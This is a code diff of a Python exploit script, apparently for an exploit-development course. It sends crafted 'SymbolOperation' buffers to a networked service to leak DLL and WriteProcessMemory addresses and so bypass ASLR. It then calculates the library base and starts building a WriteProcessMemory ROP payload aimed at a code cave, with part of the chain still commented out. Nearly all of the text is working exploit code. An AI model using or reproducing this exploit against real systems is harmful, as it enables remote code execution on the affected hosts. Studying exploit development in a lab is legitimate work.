@@ -190,10 +190,16 @@ from modules.msfvenom_module import generatePayload
 from numpy import byte
 from rpyc import lib
 
+DEBUG = False
+
 init()
 
 
 def leakFunctionAddress(func, socketTup):
+
+    # Append SymbolOperation to the Func
+    symOpFunc = b"SymbolOperation" + func
+
     # Checksum
     buf = bytearray()
 
@@ -209,7 +215,7 @@ def leakFunctionAddress(func, socketTup):
     buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34
 
     # psCommandBuffer
-    buf += func + b"A" * (0x100 - len(func))
+    buf += symOpFunc + b"A" * (0x100 - len(symOpFunc))
     buf += b"B" * 0x100
     buf += b"C" * 0x100
 
@@ -222,18 +228,21 @@ def leakFunctionAddress(func, socketTup):
             s.settimeout(timeout_seconds)
             s.connect(socketTup)
 
-            print(Fore.CYAN + f"o Sending Buffer ({len(buf)} bytes): " + Style.RESET_ALL)
+            # Send the buffer to the server
             s.sendall(buf)
-            printBuffer(buf, width="dd")
-            print(f"{Fore.GREEN}o Buffer sent successfully!{Style.RESET_ALL}")
+            if DEBUG:
+                printBuffer(buf, width="dd")
+                print(f"{Fore.GREEN}o Buffer sent {len(buf)} bytes successfully!{Style.RESET_ALL}")
 
             # Print out response from server
-            print(Fore.CYAN + f"o Waiting for response from server..." + Style.RESET_ALL)
+            if DEBUG:
+                print(Fore.CYAN + f"o Waiting for response from server..." + Style.RESET_ALL)
             response = b""
             while True:
                 try:
                     chunk = s.recv(1024)
-                    print(f"{Fore.YELLOW}Received chunk: {chunk}{Style.RESET_ALL}")
+                    if DEBUG:
+                        print(f"{Fore.YELLOW}Received chunk: {chunk}{Style.RESET_ALL}")
                 except socket.timeout:
                     break
                 if not chunk:
@@ -248,10 +257,10 @@ def leakFunctionAddress(func, socketTup):
 
             # Should have a valid response, parse it and get the address
             functionAddress = parseResponse(response)
-            print(Fore.GREEN + f"o Found leaked address: 0x{functionAddress:08x}" + Style.RESET_ALL)
+            print(Fore.GREEN + f"o Leaked {func.decode('utf-8').strip(chr(0))}: {Fore.LIGHTYELLOW_EX} 0x{functionAddress:08x}" + Style.RESET_ALL)
 
             if functionAddress == 1:
-                print(Fore.RED + "[-] Failed to leak WriteProcessMemory address" + Style.RESET_ALL)
+                print(Fore.RED + f"[-] Failed to leak address for {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
                 sys.exit(1)
 
             # Return the address only
@@ -330,23 +339,29 @@ def main():
     print(Fore.CYAN + f"o IP Addr: {server}:{port}" + Style.RESET_ALL)
 
     try:
+        functions = [b"N98E_CRYPTO_get_new_lockid" + b"\x00", b"WriteProcessMemory" + b"\x00"]
+        leakedAddresses = []
 
         # ************************************************************************************
         # ******************************* ASLR Bypass Start***********************************
         # ************************************************************************************
 
-        # Get Addr of ExportFunction
-        exportedFunc = leakFunctionAddress(b"SymbolOperationN98E_CRYPTO_get_new_lockid" + b"\x00", (server, port))
+        # Leak addresses of functions
+        for func in functions:
+            leakedAddresses.append(leakFunctionAddress(func, (server, port)))
 
-        # Get Addr of WPM
-        WPMAddr = leakFunctionAddress(b"SymbolOperationWriteProcessMemory" + b"\x00", (server, port))
+        WPMAddr = leakedAddresses[1]  # WriteProcessMemory address
+        exportedFunc = leakedAddresses[0]  # N98E_CRYPTO_get_new_lockid address
 
         # Target Function Offset observed from loading the dll in IDA was noted
         functionOffset = 0x14E0
 
         libraryBase = exportedFunc - functionOffset
-        print(Fore.GREEN + f"o Calculated library base: {str(hex(libraryBase))}\n" + Style.RESET_ALL)
-        print(Fore.GREEN + f"o Leaked WriteProcessMemory address: {hex(WPMAddr)}\n" + Style.RESET_ALL)
+        print(
+            Fore.GREEN
+            + f"o Calculated library base via\n\t\t {functions[0].decode("utf-8")}: {Fore.LIGHTYELLOW_EX}{str(hex(libraryBase))}"
+            + Style.RESET_ALL
+        )
 
         # ************************************************************************************
         # ************************************ Abuse WPM *************************************
@@ -364,33 +379,33 @@ def main():
         buf += bytearray([0x41] * 0x8)
 
         # psCommandBuffer
+        # NOTE:: My code cave is larger than the book's 0x400
+        #        which is why the offset is lower than 0x92c04
         wpm = pack("<L", (WPMAddr))  # WriteProcessMemory Address
-        wpm += pack("<L", (libraryBase + 0x92C04))  # Shellcode Return Address
+        wpm += pack("<L", (libraryBase + 0x880b0))  # Shellcode Return Address
         wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle
-        wpm += pack("<L", (libraryBase + 0x92C04))  # Code cave address
+        wpm += pack("<L", (libraryBase + 0x880b0))  # Code cave address
         wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address)
         wpm += pack("<L", (0x42424242))  # dummy nSize
-        wpm += pack("<L", (libraryBase + 0xE401C))  # lpNumberOfBytesWritten
+        wpm += pack("<L", (libraryBase + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
         wpm += b"A" * 0x10
 
         offset = b"A" * (276 - len(wpm))
-        eip = pack("<L", (libraryBase + 0x408d6))  # push esp; pop esi; ret <- Save ESP to ESI
-
+        eip = pack("<L", (libraryBase + 0x408D6))  # push esp; pop esi; ret <- Save ESP to ESI
 
         # Patching lpBuffer
-        # rop = 
-        # mov eax, esi; 
-
+        # rop =
+        # mov eax, esi;
 
         # # Patching lpBuffer, need it to point to our shellcode address on stack
         # rop = pack("<L", (dllBase + 0x296f))     # mov eax, esi; pop esi; ret
         # rop += pack("<L", (0x42424242))          # dummy value
         # rop += pack("<L", (dllBase + 0x117c))    # pop ecx; ret
-        # rop += pack("<L", (0x88888888))          # push huge value to 
-        # rop += pack("<L", (dllBase + 0x1d0f0))  
-        # rop += pack("<L", (dllBase + 0x117c))   
+        # rop += pack("<L", (0x88888888))          # push huge value to
+        # rop += pack("<L", (dllBase + 0x1d0f0))
+        # rop += pack("<L", (dllBase + 0x117c))
         # rop += pack("<L", (0x77777878))
-        # rop += pack("<L", (dllBase + 0x1d0f0))  
+        # rop += pack("<L", (dllBase + 0x1d0f0))
     except KeyboardInterrupt:
         print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
         return 1
